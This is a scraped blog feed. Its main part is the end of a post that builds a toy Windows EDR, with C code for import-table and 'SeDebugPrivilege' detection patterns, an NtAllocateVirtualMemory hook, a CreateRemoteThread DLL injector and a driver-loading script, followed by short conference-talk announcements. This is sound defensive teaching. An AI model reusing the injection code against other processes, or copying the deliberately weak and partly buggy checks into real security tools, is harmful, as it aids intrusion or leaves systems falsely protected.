binary is signed\nIf the OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread functions are listed in the IAT (Import Address Table)\nIf the string SeDebugPrivilege is present in the binary\nBelow is the code of the agent:\n\n#include <stdio.h>\n#include <windows.h>\n#include <dbghelp.h>\n#include <wintrust.h>\n#include <Softpub.h>\n#include <wincrypt.h>\n\n#pragma comment (lib, \"wintrust.lib\")\n#pragma comment(lib, \"dbghelp.lib\")\n#pragma comment(lib, \"crypt32.lib\")\n\n#define MESSAGE_SIZE 2048\n\nBOOL VerifyEmbeddedSignature(const wchar_t* binaryPath) {\n    LONG lStatus;\n    WINTRUST_FILE_INFO FileData;\n    memset(&FileData, 0, sizeof(FileData));\n    FileData.cbStruct = sizeof(WINTRUST_FILE_INFO);\n    FileData.pcwszFilePath = binaryPath;\n    FileData.hFile = NULL;\n    FileData.pgKnownSubject = NULL;\n    GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;\n    WINTRUST_DATA WinTrustData;\n\n    // Initializing necessary structures\n    memset(&WinTrustData, 0, sizeof(WinTrustData));\n    WinTrustData.cbStruct = sizeof(WinTrustData);\n    WinTrustData.pPolicyCallbackData = NULL;\n    WinTrustData.pSIPClientData = NULL;\n    WinTrustData.dwUIChoice = WTD_UI_NONE;\n    WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;\n    WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;\n    WinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;\n    WinTrustData.hWVTStateData = NULL;\n    WinTrustData.pwszURLReference = NULL;\n    WinTrustData.dwUIContext = 0;\n    WinTrustData.pFile = &FileData;\n\n    // WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.\n    lStatus = WinVerifyTrust(NULL, &WVTPolicyGUID, &WinTrustData);\n\n    BOOL isSigned;\n    switch (lStatus) {\n        // The file is signed and the signature was verified\n    case ERROR_SUCCESS:\n        isSigned = TRUE;\n        break;\n\n        // File is signed but the signature is not verified or is not trusted\n    case TRUST_E_SUBJECT_FORM_UNKNOWN || TRUST_E_PROVIDER_UNKNOWN || TRUST_E_EXPLICIT_DISTRUST || CRYPT_E_SECURITY_SETTINGS || TRUST_E_SUBJECT_NOT_TRUSTED:\n        isSigned = TRUE;\n        break;\n\n        // The file is not signed\n    case TRUST_E_NOSIGNATURE:\n        isSigned = FALSE;\n        break;\n\n        // Shouldn't happen but hey may be!\n    default:\n        isSigned = FALSE;\n        break;\n    }\n\n    // Any hWVTStateData must be released by a call with close.\n    WinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;\n    WinVerifyTrust(NULL, &WVTPolicyGUID, &WinTrustData);\n\n    return isSigned;\n}\n\nBOOL ListImportedFunctions(const wchar_t* binaryPath) {\n    BOOL isOpenProcessPresent = FALSE;\n    BOOL isVirtualAllocExPresent = FALSE;\n    BOOL isWriteProcessMemoryPresent = FALSE;\n    BOOL isCreateRemoteThreadPresent = FALSE;\n    // Load the target binary so that we can parse its content\n    HMODULE hModule = LoadLibraryEx(binaryPath, NULL, DONT_RESOLVE_DLL_REFERENCES);\n    if (hModule != NULL) {\n        // Get NT headers from the binary\n        IMAGE_NT_HEADERS* ntHeaders = ImageNtHeader(hModule);\n        if (ntHeaders != NULL) {\n            // Locate the IAT\n            IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n            // Loop over the DLL's\n            while (importDesc->Name != 0) {\n                const char* moduleName = (const char*)((BYTE*)hModule + importDesc->Name);\n\n                // Loop over the functions of the DLL\n                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)((BYTE*)hModule + importDesc->OriginalFirstThunk);\n                while (thunk->u1.AddressOfData != 0) {\n                    if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {\n                        // printf(\"\\tOrdinal: %llu\\n\", IMAGE_ORDINAL(thunk->u1.Ordinal));\n                    }\n                    else {\n                        IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)hModule + thunk->u1.AddressOfData);\n                        // printf(\"\\tFunction: %s\\n\", importByName->Name);\n                        // Checks if the following functions are used by the binary\n\n                        if (strcmp(\"OpenProcess\", importByName->Name) == 0) {\n                            isOpenProcessPresent = TRUE;\n                        }\n\n                        if (strcmp(\"VirtualAllocEx\", importByName->Name) == 0) {\n                            isVirtualAllocExPresent = TRUE;\n                        }\n\n                        if (strcmp(\"WriteProcessMemory\", importByName->Name) == 0) {\n                            isWriteProcessMemoryPresent = TRUE;\n                        }\n\n                        if (strcmp(\"CreateRemoteThread\", importByName->Name) == 0) {\n                            isCreateRemoteThreadPresent = TRUE;\n                        }\n\n                    }\n                    thunk++;\n                }\n                importDesc++;\n            }\n            FreeLibrary(hModule);\n        }\n        FreeLibrary(hModule);\n    }\n\n    if (isOpenProcessPresent && isVirtualAllocExPresent && isWriteProcessMemoryPresent && isCreateRemoteThreadPresent) {\n        return TRUE;\n    }\n    else {\n        return FALSE;\n    }\n    return FALSE;\n}\n\nBOOL lookForSeDebugPrivilegeString(const wchar_t* filename) {\n    FILE* file;\n    _wfopen_s(&file, filename, L\"rb\");\n    if (file != NULL) {\n        fseek(file, 0, SEEK_END);\n        long file_size = ftell(file);\n        rewind(file);\n        char* buffer = (char*)malloc(file_size);\n        if (buffer != NULL) {\n            if (fread(buffer, 1, file_size, file) == file_size) {\n                const char* search_string = \"SeDebugPrivilege\";\n                size_t search_length = strlen(search_string);\n                int i, j;\n                int found = 0;\n                for (i = 0; i <= file_size - search_length; i++) {\n                    for (j = 0; j < search_length; j++) {\n                        if (buffer[i + j] != search_string[j]) {\n                            break;\n                        }\n                    }\n                    if (j == search_length) {\n                        return TRUE;\n                    }\n                }\n            }\n            free(buffer);\n        }\n        fclose(file);\n    }\n    return FALSE;\n}\n\nint main() {\n    LPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\dumbedr-analyzer\";\n    DWORD bytesRead = 0;\n    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n\n    printf(\"Launching analyzer named pipe server\\n\");\n\n    // Creates a named pipe\n    HANDLE hServerPipe = CreateNamedPipe(\n        pipeName,                 // Pipe name to create\n        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)\n        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)\n        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES\n        MESSAGE_SIZE,             // Number of bytes for output buffer\n        MESSAGE_SIZE,             // Number of bytes for input buffer\n        0,                        // Pipe timeout \n        NULL                      // Security attributes (anonymous connection or may be needs credentials. )\n    );\n\n    while (TRUE) {\n\n        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections\n        BOOL isPipeConnected = ConnectNamedPipe(\n            hServerPipe, // Handle to the named pipe\n            NULL         // Whether or not the pipe supports overlapped operations\n        );\n\n        wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n        if (isPipeConnected) {\n            // Read from the named pipe\n            ReadFile(\n                hServerPipe,         // Handle to the named pipe\n                &target_binary_file, // Target buffer where to stock the output\n                MESSAGE_SIZE,        // Size of the buffer\n                &bytesRead,          // Number of bytes read from ReadFile\n                NULL                 // Whether or not the pipe supports overlapped operations\n            );\n\n            printf(\"~> Received binary file %ws\\n\", target_binary_file);\n            int res = 0;\n\n            BOOL isSeDebugPrivilegeStringPresent = lookForSeDebugPrivilegeString(target_binary_file);\n            if (isSeDebugPrivilegeStringPresent == TRUE) {\n                printf(\"\\t\\033[31mFound SeDebugPrivilege string.\\033[0m\\n\");\n            }\n            else {\n                printf(\"\\t\\033[32mSeDebugPrivilege string not found.\\033[0m\\n\");\n            }\n\n            BOOL isDangerousFunctionsFound = ListImportedFunctions(target_binary_file);\n            if (isDangerousFunctionsFound == TRUE) {\n                printf(\"\\t\\033[31mDangerous functions found.\\033[0m\\n\");\n            }\n            else {\n                printf(\"\\t\\033[32mNo dangerous functions found.\\033[0m\\n\");\n            }\n\n            BOOL isSigned = VerifyEmbeddedSignature(target_binary_file);\n            if (isSigned == TRUE) {\n                printf(\"\\t\\033[32mBinary is signed.\\033[0m\\n\");\n            }\n            else {\n                printf(\"\\t\\033[31mBinary is not signed.\\033[0m\\n\");\n            }\n\n            wchar_t response[MESSAGE_SIZE] = { 0 };\n            if (isSigned == TRUE) {\n                swprintf_s(response, MESSAGE_SIZE, L\"OK\\0\");\n                printf(\"\\t\\033[32mStaticAnalyzer allows\\033[0m\\n\");\n            }\n            else {\n                // If the following conditions are met, the binary is blocked\n                if (isDangerousFunctionsFound || isSeDebugPrivilegeStringPresent) {\n                    swprintf_s(response, MESSAGE_SIZE, L\"KO\\0\");\n                    printf(\"\\n\\t\\033[31mStaticAnalyzer denies\\033[0m\\n\");\n                }\n                else {\n                    swprintf_s(response, MESSAGE_SIZE, L\"OK\\0\");\n                    printf(\"\\n\\t\\033[32mStaticAnalyzer allows\\033[0m\\n\");\n                }\n            }\n\n            DWORD bytesWritten = 0;\n            // Write to the named pipe\n            WriteFile(\n                hServerPipe,   // Handle to the named pipe\n                response,      // Buffer to write from\n                MESSAGE_SIZE,  // Size of the buffer \n                &bytesWritten, // Numbers of bytes written\n                NULL           // Whether or not the pipe supports overlapped operations\n            );\n\n        }\n\n        // Disconnect\n        DisconnectNamedPipe(\n            hServerPipe // Handle to the named pipe\n        );\n\n        printf(\"\\n\\n\");\n    }\n    return 0;\n}\nPretty simple. The remote injector agent will be a little bit more complicated!\n2/ The remote injector\nOne thing EDR’s like to do is to apply a mechanism called function hooking.\nAs we have seen before, and because of PatchGuard, it is not possible to modify the SSDT or any other critical kernel structures anymore. So what anti-virus editors thought of is to instead modify the NTDLL.dll directly. Since it is the last building block before entering kernel space, and since it is the user mode reflection of the kernel itself, if a defender is able to analyse the parameters sent to the functions exposed by the NTDLL.dll, they will be able to dynamically analyse if these function calls are legitimate or malicious. To do so, EDR’s simply temporarily redirect code flow from NTDLL.dll functions to their own code:\n\nThe question is, how do you redirect code flow from NTDLL.dll? When a process is created, it loads a copy of a few necessary DLL’s. Obviously, a copy of NTDLL.dll is made and, if we are skilled enough, we can modify its content. To modify the flow of a function from NTDLL.dll, we simply need to parse the DLL, find the functions we want to hook and modify its code so that it jumps to the code of our EDR instead.\nEasy in theory. A lot harder in practice. Thankfully there is an insane library called MinHook, developed by TsudaKageyu, that will allow us to achieve our hooking goal quite easily. Using the MinHook library we are going to build a DLL that the remote injector agent will inject into each and every process that is created. This DLL will only hook one function from the NTDLL.dll: NtAllocateVirtualMemory. Why this function? Because the NtAllocateVirtualMemory is the function from NTDLL.dll that is used to allocate and protect a memory space. Since our EDR will focus on detecting tools that injects shellcode remotely, this function is the most important one to monitor.\nBelow you will find the commented code of the DLL that we will inject (thankfully it includes usage of minhook):\n\n#include \"pch.h\"\n#include \"minhook/include/MinHook.h\"\n\n\n// Defines the prototype of the NtAllocateVirtualMemoryFunction\ntypedef DWORD(NTAPI* pNtAllocateVirtualMemory)(\n    HANDLE ProcessHandle,\n    PVOID* BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T RegionSize,\n    ULONG AllocationType,\n    ULONG Protect\n    );\n\n// Pointer to the trampoline function used to call the original NtAllocateVirtualMemory\npNtAllocateVirtualMemory pOriginalNtAllocateVirtualMemory = NULL;\n\n// This is the function that will be called whenever the injected process calls \n// NtAllocateVirtualMemory. This function takes the arguments Protect and checks\n// if the requested protection is RWX (which shouldn't happen).\nDWORD NTAPI NtAllocateVirtualMemory(\n    HANDLE ProcessHandle, \n    PVOID* BaseAddress, \n    ULONG_PTR ZeroBits, \n    PSIZE_T RegionSize, \n    ULONG AllocationType, \n    ULONG Protect\n) {\n\n    // Checks if the program is trying to allocate some memory and protect it with RWX \n    if (Protect == PAGE_EXECUTE_READWRITE) {\n        // If yes, we notify the user and terminate the process\n        MessageBox(NULL, L\"Dude, are you trying to RWX me ?\", L\"Found u bro\", MB_OK);\n        TerminateProcess(GetCurrentProcess(), 0xdeadb33f);\n    }\n\n    //If no, we jump on the originate NtAllocateVirtualMemory\n    return pOriginalNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);\n}\n\n// This function initializes the hooks via the MinHook library\nDWORD WINAPI InitHooksThread(LPVOID param) {\n    if (MH_Initialize() != MH_OK) {\n        return -1;\n    }\n\n    // Here we specify which function from wich DLL we want to hook\n    MH_CreateHookApi(   \n        L\"ntdll\",                                     // Name of the DLL containing the function to  hook\n        \"NtAllocateVirtualMemory\",                    // Name of the function to hook\n        NtAllocateVirtualMemory,                      // Address of the function on which to jump when hooking \n        (LPVOID *)(&pOriginalNtAllocateVirtualMemory) // Address of the original NtAllocateVirtualMemory function\n    );\n\n    // Enable the hook on NtAllocateVirtualMemory\n    MH_STATUS status = MH_EnableHook(MH_ALL_HOOKS);\n    return status;\n}\n\n// Here is the DllMain of our DLL\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){\n    switch (ul_reason_for_call){\n    case DLL_PROCESS_ATTACH: {\n        // This DLL will not be loaded by any thread so we simply disable DLL_TRHEAD_ATTACH and DLL_THREAD_DETACH\n        DisableThreadLibraryCalls(hModule);\n\n        // Calling WinAPI32 functions from the DllMain is a very bad practice \n        // since it can basically lock the program loading the DLL\n        // Microsoft recommends not using any functions here except a few one like \n        // CreateThread IF AND ONLY IF there is no need for synchronization\n        // So basically we are creating a thread that will execute the InitHooksThread function \n        // thus allowing us hooking the NtAllocateVirtualMemory function\n        HANDLE hThread = CreateThread(NULL, 0, InitHooksThread, NULL, 0, NULL);\n        if (hThread != NULL) {\n            CloseHandle(hThread);\n        }\n        break;\n    }\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\nWith the DLL created, we need to inject it into every process we want to monitor. That’s the job of the RemoteInjector agent which receives, from the driver, the PID of the process in which to inject the DLL:\n\n#include <stdio.h>\n#include <windows.h>\n\n#define MESSAGE_SIZE 2048\n#define MAX_PATH 260\n\nint main() {\n    LPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\dumbedr-injector\";\n    DWORD bytesRead = 0;\n    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n\n    char dll_path[] = \"x64\\\\Debug\\\\MyDumbEDRDLL.dll\";\n    char dll_full_path[MAX_PATH];\n    GetFullPathNameA(dll_path, MAX_PATH, dll_full_path, NULL);\n    printf(\"Launching injector named pipe server, injecting %s\\n\", dll_full_path);\n\n\n    // Creates a named pipe\n    HANDLE hServerPipe = CreateNamedPipe(\n        pipeName,                 // Pipe name to create\n        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)\n        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)\n        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES\n        MESSAGE_SIZE,             // Number of bytes for output buffer\n        MESSAGE_SIZE,             // Number of bytes for input buffer\n        0,                        // Pipe timeout \n        NULL                      // Security attributes (anonymous connection or may be needs credentials. )\n    );\n\n    while (TRUE) {\n\n        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections\n        BOOL isPipeConnected = ConnectNamedPipe(\n            hServerPipe, // Handle to the named pipe\n            NULL         // Whether or not the pipe supports overlapped operations\n        );\n\n        wchar_t message[MESSAGE_SIZE] = { 0 };\n        \n        if (isPipeConnected) {\n\n            // Read from the named pipe\n            ReadFile(\n                hServerPipe,  // Handle to the named pipe\n                &message,     // Target buffer where to stock the output\n                MESSAGE_SIZE, // Size of the buffer\n                &bytesRead,   // Number of bytes read from ReadFile\n                NULL          // Whether or not the pipe supports overlapped operations\n            );\n\n            // Casting the message into a DWORD\n            DWORD target_pid = _wtoi(message);\n            printf(\"~> Received process id %d\\n\", target_pid);\n\n            // Opening the process with necessary privileges \n            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);\n            if (hProcess == NULL) {\n                printf(\"Can't open handle, error: % lu\\n\", GetLastError());\n                return FALSE;\n            }\n            printf(\"\\tOpen handle on PID: %d\\n\", target_pid);\n\n            // Looking for the LoadLibraryA function in the kernel32.dll\n            FARPROC loadLibAddress = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryA\");\n            if (loadLibAddress == NULL) {\n                printf(\"Could not find LoadLibraryA, error: %lu\\n\", GetLastError());\n                return FALSE;\n            }\n            printf(\"\\tFound LoadLibraryA function\\n\");\n\n            // Allocating some memory wth read/write privileges\n            LPVOID vae_buffer;\n            vae_buffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (vae_buffer == NULL){\n                printf(\"Can't allocate memory, error: %lu\\n\", GetLastError());\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(\"\\tAllocated: %d bytes\\n\", MAX_PATH);\n\n            // Writing the path of the DLL to inject: x64\\Debug\\MyDumbEDRDLL.dll\n            SIZE_T bytesWritten;\n            if (!WriteProcessMemory(hProcess, vae_buffer, dll_full_path, MAX_PATH, &bytesWritten)) {\n                printf(\"Can't write into memory, error: %lu\\n\", GetLastError());\n                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(\"\\tWrote %zu in %d process memory\\n\", bytesWritten, target_pid);\n\n            // Creating a thread that will call LoadLibraryA and the path of the MyDUMBEDRDLL to load as argument\n            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddress, vae_buffer, 0, NULL);\n            if (hThread == NULL) {\n                printf(\"Can't launch remote thread, error: %lu\\n\", GetLastError());\n                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(\"\\tLaunched remote thread\\n\");\n\n            // Freeing allocated memory as well as handles\n            VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n            CloseHandle(hThread);\n            CloseHandle(hProcess);\n            printf(\"\\tClosed handle\\n\");\n\n            wchar_t response[MESSAGE_SIZE] = { 0 };\n            swprintf_s(response, MESSAGE_SIZE, L\"OK\\0\");\n            DWORD pipeBytesWritten = 0;\n            \n            // Inform the driver that the injection was successful\n            WriteFile(\n                hServerPipe,       // Handle to the named pipe\n                response,          // Buffer to write from\n                MESSAGE_SIZE,      // Size of the buffer \n                &pipeBytesWritten, // Numbers of bytes written\n                NULL               // Whether or not the pipe supports overlapped operations\n            );\n\n            // Disconnect\n            DisconnectNamedPipe(\n                hServerPipe // Handle to the named pipe\n            );\n\n            printf(\"\\n\\n\");        \n        }\n    }\n}\nRunning all of that, we can see that the assembly code of the NtAllocateVirtualMemory function of the NTDLL.dll of a process that was injected is the following:\n\nWhile a more legitimate disassembled code should look like this:\n\nAs you can see the first assembly instruction of the hooked NtAllocateVirtualMemory function is a jmp which will redirect the code flow from the NTDLL.dll to the address “00007FFAA06A0FD6” which is… Our injected EDR’s DLL:\n\nAt this point our EDR is fully functional! Let’s test it!\nVIII/ MyDumbEDR demo\nNow that we have our two agents as well as the driver, we can compile them and launch the entire project to see it in action!\nTo simplify the launching of the entire EDR solution, I created a small batch script whose contents are the following:\n// Launches the kernel driver\nsc create mydumbedr type=kernel binpath=Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRDriver.sys\nsc start mydumbedr\n// Starts the StaticAnalyzer agent\nstart cmd.exe /c Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRStaticAnalyzer.exe\n// Starts the RemoteInjector agent \nstart cmd.exe /c Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRRemoteInjector.exe \n// Starts dbgview.exe\nstart dbgview.exe\n\necho EDR's running, press any key to stop it\npause\n\n// Kills both agents and unloads the kernel driver\ntaskkill /F /IM MyDumbEDRStaticAnalyzer.exe \ntaskkill /F /IM MyDumbEDRRemoteInjector.exe\nsc stop mydumbedr\nsc delete mydumbedr\nLet’s run the EDR, open a notepad process that will be the target of the shellcode injection and run the ShellcodeInjector binary to see how the EDR works in live action:\n\n\n\n\nAs you can see, the StaticAnalyzer agent detected that the binary was malicious. The RemoteInjector injected the MyDumbEDRDLL into the malicious process and when it tried to allocate a memory page with RWX to write and execute the shellcode, the EDR detected it and terminated the process thus protecting the notepad.exe process.\nAs such, we can say that our EDR is strong enough to detect both statically and dynamically malicious binaries trying to remotely inject shellcode!\nIX/ Conclusion\nThroughout this article we have seen how to develop a Windows driver, how to turn it into a EDR’s kernel driver and how to build a dummy EDR.\nThere are 3 reasons why I wanted to create such a thing. First I wanted to better understand how EDR’s are architected so that I can learn how to analyse the ones I’m fighting against during assessments.\nSecond, I wanted to do this research to provide an article that can be used by anyone that like me, wants to understand how EDR’s work and give them a few ideas about how you can bypass one. For that reason, I’m leaving you with a challenge: bypass MyDumbEDR. In the following repo you will find the source code of the EDR created in this blogpost as well as instructions to “capture the flag”. There are multiple ways you can bypass it, so I encourage you to read the code closely. I implemented some stupid logic that IS actually used by some EDR’s.\nThe last reason I wanted to work on building my EDR was to see how complicated it is to create a functional one. As pentesters, and red teamers, we are used to saying things like “Haha this EDR is terrible, I bypassed it easily”. Yeah you did, congrats. But remember that building a security product that is able to both detect malicious behaviours and not create too much false positives is a pain. As such, I’d like to finish this article by giving a huge thumbs up to both security product developers as well as blue teamers that are messing with the red’s during our assessments!\nHappy hacking folks!\nThis is a cross-post from: https://blog.whiteflag.io/blog/from-windows-driver-to-a-almost-fully-working-edr/.",
      "content": "TL;DR I wanted to better understand EDR&amp;#x2019;s so I built a dummy EDR and talk about it here. \n\n",
      "contentSnippet": "TL;DR I wanted to better understand EDR&#x2019;s so I built a dummy EDR and talk about it here.",
      "guid": "https://sensepost.com/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/",
      "isoDate": "2024-01-31T08:33:14.000Z",
      "itunes": {}
    },
    {
      "title": "your contributions, today",
      "link": "https://sensepost.com/blog/2023/your-contributions-today/",
      "pubDate": "Wed, 20 Dec 2023 07:14:53 +0000",
      "content:encoded": "<p>Keynoting <a href=\"https://0xcon.co.za/\">0xcon</a> in Johannesburg this year, I had the immense privilege of talking and sharing ideas about something that is dear to my heart. That is, giving back more than you take. And by giving back I don&#x2019;t mean *just* doing research or writing tools. Instead, giving back includes things like writing documentation or even just teaching someone else! </p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/your-contributions-today/image-3.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"308\" src=\"https://sensepost.com/img/pages/blog/2023/your-contributions-today/image-3-1024x308.png\" alt=\"\" class=\"wp-image-71590\"></a></figure></div>\n\n\n<p>In my talk, &#x201C;your contributions, today&#x201D; I reflected on a current view of practical security research and contributions in a time of ever-increasing systems complexity, abstractions and Instagram reels. By drawing parallels to the &#x201C;Free-rider Problem&#x201D; as described in an economics context, I argued that as an industry we need to caution against this phenomenon manifesting by actively making contributions.</p>\n\n\n\n<p>The talk is available to view on <a href=\"https://www.youtube.com/watch?v=r3rO68mEJiw\">YouTube</a> now, and you can get the slides from my <a href=\"https://github.com/leonjza/public-talks/blob/master/2023/0xcon/your-contributions-today.pdf\">GitHub repository</a>. What are you going to contribute today?</p>\n",
      "content:encodedSnippet": "Keynoting 0xcon in Johannesburg this year, I had the immense privilege of talking and sharing ideas about something that is dear to my heart. That is, giving back more than you take. And by giving back I don’t mean *just* doing research or writing tools. Instead, giving back includes things like writing documentation or even just teaching someone else! \n\nIn my talk, “your contributions, today” I reflected on a current view of practical security research and contributions in a time of ever-increasing systems complexity, abstractions and Instagram reels. By drawing parallels to the “Free-rider Problem” as described in an economics context, I argued that as an industry we need to caution against this phenomenon manifesting by actively making contributions.\nThe talk is available to view on YouTube now, and you can get the slides from my GitHub repository. What are you going to contribute today?",
      "content": "Keynoting 0xcon in Johannesburg this year, I had the immense privilege of talking and sharing ideas about something that is dear to my heart. That is, giving back more than you take. And by giving back I don&amp;#x2019;t mean *just* doing research or writing tools. Instead, giving back includes things like writing documentation or even just teaching someone else! \n\n",
      "contentSnippet": "Keynoting 0xcon in Johannesburg this year, I had the immense privilege of talking and sharing ideas about something that is dear to my heart. That is, giving back more than you take. And by giving back I don&#x2019;t mean *just* doing research or writing tools. Instead, giving back includes things like writing documentation or even just teaching someone else!",
      "guid": "https://sensepost.com/blog/2023/your-contributions-today/",
      "isoDate": "2023-12-20T07:14:53.000Z",
      "itunes": {}
    },
    {
      "title": "Why defend harder won’t work in the long run and what to do instead – arrest criminals",
      "link": "https://sensepost.com/blog/2023/why-defend-harder-wont-work-in-the-long-run-and-what-to-do-instead-arrest-criminals/",
      "pubDate": "Tue, 12 Dec 2023 11:21:56 +0000",
      "content:encoded": "<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/why-defend-harder-wont-work-in-the-long-run-and-what-to-do-instead-arrest-criminals/impose-cost.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"569\" src=\"https://sensepost.com/img/pages/blog/2023/why-defend-harder-wont-work-in-the-long-run-and-what-to-do-instead-arrest-criminals/impose-cost-1024x569.jpg\" alt=\"\" class=\"wp-image-71545\"></a></figure>\n\n\n\n<p>The whole of information/cyber security is founded on the idea that we can defend ourselves into security. But in the history of competitive endeavours nobody has won by playing defence alone. We have this idea that we can wrap our users and systems in enough padding to protect them in a world where guns exist. We&#x2019;ve leaned so hard into this idea that we&#x2019;re on the floor and it&#x2019;s time to look up.&#xA0;</p>\n\n\n\n<p>In a recent keynote at BSides Cape Town I explored this idea and tried to convince people both that defending harder is an idea with a diminishing ROI, and that we instead need to use law enforcement to impact the problem at its root cause &#x2013; the criminals. Most in infosec believe and operate as if this is neither their job nor a worthwhile pursuit. I want to change that. First by convincing you that it&#x2019;s worthwhile, then by helping us understand how we can orient our activities to better invoke law enforcement.&#xA0;</p>\n\n\n\n<p>I&#x2019;d love you to watch the talk and let me know what you think. Because it&#x2019;s an idea that needs experimentation and practise. Can you include some of this in your strategy for next year?</p>\n\n\n\n<p><a href=\"https://www.youtube.com/watch?v=YNDhiH04iXw\">Watch on YouTube</a></p>\n",
      "content:encodedSnippet": "The whole of information/cyber security is founded on the idea that we can defend ourselves into security. But in the history of competitive endeavours nobody has won by playing defence alone. We have this idea that we can wrap our users and systems in enough padding to protect them in a world where guns exist. We’ve leaned so hard into this idea that we’re on the floor and it’s time to look up. \nIn a recent keynote at BSides Cape Town I explored this idea and tried to convince people both that defending harder is an idea with a diminishing ROI, and that we instead need to use law enforcement to impact the problem at its root cause – the criminals. Most in infosec believe and operate as if this is neither their job nor a worthwhile pursuit. I want to change that. First by convincing you that it’s worthwhile, then by helping us understand how we can orient our activities to better invoke law enforcement. \nI’d love you to watch the talk and let me know what you think. Because it’s an idea that needs experimentation and practise. Can you include some of this in your strategy for next year?\nWatch on YouTube",
      "content": "\n\n",
      "contentSnippet": "",
      "guid": "https://sensepost.com/blog/2023/why-defend-harder-wont-work-in-the-long-run-and-what-to-do-instead-arrest-criminals/",
      "isoDate": "2023-12-12T11:21:56.000Z",
      "itunes": {}
    },
    {
      "title": "we’re going to bsides cape town 2023",
      "link": "https://sensepost.com/blog/2023/were-going-to-bsides-cape-town-2023/",
      "pubDate": "Tue, 28 Nov 2023 07:17:03 +0000",
      "content:encoded": "<p>Arguably one of the largest hacking conferences in South Africa, <a href=\"https://bsidescapetown.co.za/bsides-conf/2023\">BSides Cape Town 2023</a> is around the corner and the SensePost Team is there with a jam packed agenda demonstrating our latest research (with <strong>five</strong> talks), challenges and more! In this post, I&#x2019;ll summarise what you can expect. For timing related information, check out the schedule <a href=\"https://pretalx.com/bsides-cape-town-2023/schedule/\">here</a>. Be sure to come and say hi at our stand in the chill area too.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/were-going-to-bsides-cape-town-2023/bsides-pixel.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"585\" src=\"https://sensepost.com/img/pages/blog/2023/were-going-to-bsides-cape-town-2023/bsides-pixel-1024x585.jpg\" alt=\"\" class=\"wp-image-71349\"></a></figure>\n\n\n\n<h2 class=\"wp-block-heading\">talks</h2>\n\n\n\n<p>Opening BSides Cape Town 2023 is <a href=\"https://twitter.com/singe\">@singe</a> with a Keynote &#x201C;<a href=\"https://pretalx.com/bsides-cape-town-2023/talk/QPBBAA/\">Impose Cost: Our defences eventually fail and we need to take the fight to the criminals</a>&#x201D; where he will argue that the only way to effectively and realistically succeed in defending our networks is to take the challenge to the real criminals and not just wait for them to come. <a href=\"https://www.youtube.com/watch?v=YNDhiH04iXw\">View on YouTube</a>.</p>\n\n\n\n<p>Next we have Reino Mostert in a talk &#x201C;<a href=\"https://pretalx.com/bsides-cape-town-2023/talk/BMEACV/\">LPE in enterprise software</a>&#x201D; demonstrating a Local Privilege Escalation vulnerability he found which was made possible by extending <a href=\"https://twitter.com/tiraniddo\">James Forshaw</a>&#x2018;s directory junction work, but chaining them to effectively bypass a mitigation the vendor implemented. <a 